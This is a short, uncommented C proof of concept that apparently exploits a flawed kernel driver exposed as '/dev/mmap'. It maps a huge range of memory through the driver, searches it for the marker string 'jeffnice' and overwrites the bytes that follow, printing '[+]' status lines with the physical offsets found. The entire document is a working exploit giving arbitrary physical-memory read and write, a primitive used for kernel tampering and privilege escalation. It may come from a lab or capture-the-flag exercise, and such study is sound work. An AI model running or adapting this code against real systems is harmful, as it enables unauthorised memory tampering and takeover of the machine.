
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

int main(void)
{
	char *addr;
	unsigned long size;
	int count = 0;
	unsigned long mmapStart = 0x57575000;

	int fd = open("/dev/mmap", O_RDWR);
	if (fd < 0)
	{
		printf("[-] open failed.\n");
		return -1;
	}
	size = 0xf0000000;
	addr = (char *)mmap((void*)mmapStart, size,
		PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (addr == MAP_FAILED) {
		perror("[-]failed to mmap:");
		close(fd);
		return -1;
	}
	printf("[+]mmap ok addr : %p\n", addr);
	while (((unsigned long)addr) < (mmapStart + size))
{
	count = 0;
	if (
	addr[count++] == 'j' &&
	addr[count++] == 'e' &&
	addr[count++] == 'f' &&
	addr[count++] == 'f' &&
	addr[count++] == 'n' &&
	addr[count++] == 'i' &&
	addr[count++] == 'c' &&
	addr[count++] == 'e'
	) {
		printf("[+]found addr %p phy:0x%lx.\n",
		       addr, (unsigned long)addr - mmapStart);
		addr[count++] = '-';
		addr[count++] = '1';
		addr[count++] = '9';

	  }
		addr ++;
	}
	close(fd);
	return 0;
}



